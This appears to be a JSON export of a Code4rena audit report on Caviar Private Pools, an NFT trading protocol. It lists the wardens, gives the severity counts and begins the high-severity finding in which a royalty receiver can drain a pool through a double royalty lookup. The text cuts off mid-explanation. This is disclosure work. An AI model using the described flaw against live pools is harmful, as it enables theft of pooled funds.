{
  "circa": {
    "title": "Caviar Private Pools",
    "sponsor": "Caviar",
    "slug": "2023-04-caviar",
    "date": "2023-05-18",
    "findings": "https://github.com/code-423n4/2023-04-caviar-findings/issues",
    "contest": 230
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Caviar Private Pools smart contract system written in Solidity. The audit took place between April 7—April 13 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>127 Wardens contributed reports to the Caviar Private Pools:</p>\n<ol>\n<li>0x4db5362c</li>\n<li>0x4non</li>\n<li>0x5rings</li>\n<li><a href=\"https://twitter.com/0x6980\">0x6980</a></li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/Kiki_developer\">0xLanterns</a> (<a href=\"https://twitter.com/Kiki_developer\">kiki_dev</a> and <a href=\"https://twitter.com/ZoumanaCisse6\">wall604</a>)</li>\n<li>0xNorman</li>\n<li>0xRobocop</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/MarioPoneder\">0xTheC0der</a></li>\n<li>0xWeiss</li>\n<li>0xbepresent</li>\n<li><a href=\"https://twitter.com/abarbatei\">ABA</a></li>\n<li><a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a></li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>Bason</li>\n<li><a href=\"https://twitter.com/bauchibred?s=21&#x26;t=7sv-1qcnwtkdTA81Iog0yQ\">Bauchibred</a></li>\n<li>Bauer</li>\n<li>BenRai</li>\n<li>BradMoon</li>\n<li>Brenzee</li>\n<li>ChrisTina</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://twitter.com/DeFiCast\">Cryptor</a></li>\n<li><a href=\"https://twitter.com/DadeKuma\">DadeKuma</a></li>\n<li>DishWasher</li>\n<li>Dug</li>\n<li><a href=\"https://twitter.com/ElKu_crypto\">ElKu</a></li>\n<li><a href=\"https://twitter.com/emeduduna\">Emmanuel</a></li>\n<li>Evo</li>\n<li>GT_Blockchain (0xTraub, <a href=\"https://twitter.com/0xTinder\">0xTinder</a>, 0x6020c0, <a href=\"https://twitter.com/MelsonZion\">zion</a>, and xkycc)</li>\n<li>Haipls</li>\n<li>J4de</li>\n<li><a href=\"https://twitter.com/0xJCN\">JCN</a></li>\n<li>JGcarv</li>\n<li>Josiah</li>\n<li><a href=\"https://www.linkedin.com/in/kayode-okunlade-862001142/\">Kaysoft</a></li>\n<li>Kek</li>\n<li><a href=\"https://twitter.com/nonfungiblenero\">Kenshin</a></li>\n<li><a href=\"https://twitter.com/KoolexC\">Koolex</a></li>\n<li>KrisApostolov</li>\n<li>Madalad</li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li><a href=\"https://twitter.com/thenaubit\">Naubit</a></li>\n<li><a href=\"https://twitter.com/0xcharwak\">Norah</a></li>\n<li><a href=\"https://twitter.com/noromeb1\">Noro</a></li>\n<li><a href=\"https://twitter.com/Nyksx__\">Nyx</a></li>\n<li><a href=\"https://twitter.com/rappenstein2\">Rappie</a></li>\n<li>RaymondFam</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SaeedAlipoor01988</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li>SovaSlava</li>\n<li>SpicyMeatball</li>\n<li>T1MOH</li>\n<li><a href=\"https://twitter.com/ToonVH_\">ToonVH</a></li>\n<li><a href=\"https://twitter.com/VoyvodaSec\">Voyvoda</a> (<a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a>, <a href=\"https://twitter.com/deadrosesxyz\">deadrxsezzz</a>, and alexxander)</li>\n<li><a href=\"https://twitter.com/WorstNi43511849\">W0RR1O</a></li>\n<li>abiih</li>\n<li><a href=\"https://twitter.com/adrianromero\">adriro</a></li>\n<li>anodaram</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li>ayden</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li><a href=\"https://www.linkedin.com/in/aminbashiri/\">bshramin</a></li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/carlitox477\">carlitox477</a></li>\n<li><a href=\"https://twitter.com/CatellaTech\">catellatech</a></li>\n<li>chaduke</li>\n<li>ck</li>\n<li>climber2002</li>\n<li>codeslide</li>\n<li>cryptonue</li>\n<li>decade</li>\n<li><a href=\"https://twitter.com/devScrooge\">devscrooge</a></li>\n<li><a href=\"https://twitter.com/dingo2077/\">dingo2077</a></li>\n<li>fs0c</li>\n<li><a href=\"https://twitter.com/georgits_\">georgits</a></li>\n<li><a href=\"https://twitter.com/giovannidisiena\">giovannidisiena</a></li>\n<li>hasmama</li>\n<li><a href=\"https://twitter.com/henryxf3\">hihen</a></li>\n<li>holyhansss_kr</li>\n<li><a href=\"https://twitter.com/hunt3r_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://twitter.com/krenkmet\">indijanc</a></li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>jpserrat</li>\n<li><a href=\"https://twitter.com/0xJuancito\">juancito</a></li>\n<li><a href=\"https://twitter.com/Xc1008Cui\">ladboy233</a></li>\n<li>lukris02</li>\n<li>matrix_0wl</li>\n<li><a href=\"https://twitter.com/0xMinhT\">minhtrng</a></li>\n<li><a href=\"https://twitter.com/nem_veer\">nemveer</a></li>\n<li><a href=\"https://twitter.com/neumoXX\">neumo</a></li>\n<li><a href=\"https://twitter.com/nobody20185\">nobody2018</a></li>\n<li>oxen</li>\n<li>p0wd3r</li>\n<li>peanuts</li>\n<li><a href=\"https://twitter.com/real_philogy\">philogy</a></li>\n<li>rbserver</li>\n<li>rvierdiiev</li>\n<li>saian</li>\n<li>said</li>\n<li>sashik_eth</li>\n<li>savi0ur</li>\n<li><a href=\"https://twitter.com/sayan_011\">sayan</a></li>\n<li>sces60107</li>\n<li><a href=\"https://twitter.com/shaka0x\">shaka</a></li>\n<li>tallo</li>\n<li>tanh</li>\n<li><a href=\"https://twitter.com/teawaterwire\">teawaterwire</a></li>\n<li><a href=\"https://twitter.com/0xteddav\">teddav</a></li>\n<li>tnevler</li>\n<li><a href=\"https://twitter.com/cvetanovv0\">tsvetanovv</a></li>\n<li>ulqiorra</li>\n<li>wintermute</li>\n<li><a href=\"https://www.linkedin.com/in/yahia-chaabane/\">ych18</a></li>\n<li><a href=\"https://twitter.com/yixxas\">yixxas</a></li>\n<li><a href=\"https://twitter.com/MelsonZion\">zion</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://twitter.com/GalloDaSballo\">Alex the Entreprenerd</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a> and <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 20 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 17 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 25 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 6 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-04-caviar\">C4 Caviar Private Pools repository</a>, and is composed of 4 smart contracts and 1 interface written in the Solidity programming language and includes 741 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-3\" style=\"position:relative;\"><a href=\"#high-risk-findings-3\" aria-label=\"high risk findings 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (3)</h1>\n<h2 id=\"h-01-royalty-receiver-can-drain-a-private-pool\" style=\"position:relative;\"><a href=\"#h-01-royalty-receiver-can-drain-a-private-pool\" aria-label=\"h 01 royalty receiver can drain a private pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/320\">[H-01] Royalty receiver can drain a private pool</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/320\">Voyvoda</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/593\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/527\">teddav</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/471\">aviggiano</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/62\">Haipls</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L274\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L274</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Royalty fee calculation has a serious flaw in <code>buy(...)</code>. Caviar’s private pools could be completely drained.</p>\n<p>In the Caviar private pool, <a href=\"https://eips.ethereum.org/EIPS/eip-2981\">NFT royalties</a> are being paid from the <code>msg.sender</code> to the NFT royalty receiver of each token in PrivatePool.buy and PrivatePool.sell:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        #</span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">274</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">278</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">280</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">281</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">282</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L352\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L352</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        #</span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\">,</span><span class=\"mtk12\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Message</span><span class=\"mtk1\">[])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">333</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">338</span><span class=\"mtk1\">:            (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">345</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">346</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:            }</span></span></span></code></pre>\n<p>In both functions, the amount needed to pay all royalties is taken from the <code>msg.sender</code> who is either the buyer or the seller depending on the context. In PrivatePool.sell, this amount is first paid by the pool and then taken from the <code>msg.sender</code> by simply reducing what they receive in return for the NFTs they are selling. A similar thing is done in PrivatePool.buy, but instead of reducing the output amount, the input amount of base tokens that the <code>msg.sender</code> (buyer) should pay to the pool is increased:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L251-L252\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L251-L252</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        #</span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">251</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// add the royalty fee amount to the net input aount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L354-L355\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L354-L355</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        #</span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\">,</span><span class=\"mtk12\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Message</span><span class=\"mtk1\">[])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">354</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// subtract the royalty fee amount from the net output amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">355</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The difference between these two functions (that lies at the core of the problem) is that in PrivatePool.buy, the <code>_getRoyalty</code> function is called twice. The first time is to calculate the total amount of royalties to be paid, and the second time is to actually send each royalty fee to each recipient:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L242-L248\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L242-L248</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L273-L274\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L273-L274</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        #</span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span 